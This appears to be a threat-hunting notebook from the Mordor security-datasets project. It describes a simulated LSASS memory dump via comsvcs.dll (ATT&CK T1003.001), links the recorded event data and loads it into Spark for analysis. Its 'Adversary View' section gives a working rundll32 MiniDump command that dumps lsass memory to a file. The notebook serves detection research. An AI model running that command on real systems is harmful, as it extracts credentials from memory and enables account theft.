# %% [markdown]
# # Lsass Memory Dump via Comsvcs.dll

# %% [markdown]
# ## Metadata

# %% [markdown]
# |                   |    |
# |:------------------|:---|
# | Author            | Roberto Rodriguez @Cyb3rWard0g |
# | Creation Date     | 2020/10/18 |
# | Modification Date | 2020/10/18 |
# | Tactics           | ['[TA0006](https://attack.mitre.org/tactics/TA0006)'] |
# | Techniques        | ['[T1003.001](https://attack.mitre.org/techniques/T1003/001)'] |
# | Tags              | ['art.2536dee2-12fb-459a-8c37-971844fa73be'] |

# %% [markdown]
# ## Dataset Description
# This dataset represents adversaries leveraging the MiniDump export function from comsvcs.dll via rundll32 to perform a memory dump from lsass.

# %% [markdown]
# ## Datasets Downloads

# %% [markdown]
# | Dataset Type | Link   |
# |:-------------|:-------|
# | Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_lsass_memory_dump_comsvcs.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_lsass_memory_dump_comsvcs.zip) |

# %% [markdown]
# ## Notebooks
# Notebooks created by the community leveraging the mordor datasets

# %% [markdown]
# | Author | Name | Link |
# |:-------|:-----|:-----|

# %% [markdown]
# ## Simulation Plan

# %% [markdown]
# | Environment | Tool Type | Module |
# |:------------|:----------|:-------|
# | Lab VM | Manual | [Powershell](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md#atomic-test-3---dump-lsassexe-memory-using-comsvcsdll) |

# %% [markdown]
# ## Adversary View
# ```
# C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
# ```

# %% [markdown]
# ## Explore Mordor Dataset

# %% [markdown]
# ### Initialize Analytics Engine

# %%
from openhunt.mordorutils import *
spark = get_spark()

# %% [markdown]
# ### Download & Process Mordor File

# %%
mordor_file = "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/small/windows/credential_access/host/psh_lsass_memory_dump_comsvcs.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

# %% [markdown]
# ### Get to know your data

# %%
df = spark.sql(
'''
SELECT Hostname,Channel,EventID, Count(*) as count
FROM mordorTable
GROUP BY Hostname,Channel,EventID
ORDER BY count DESC
'''
)
df.show(truncate=False)
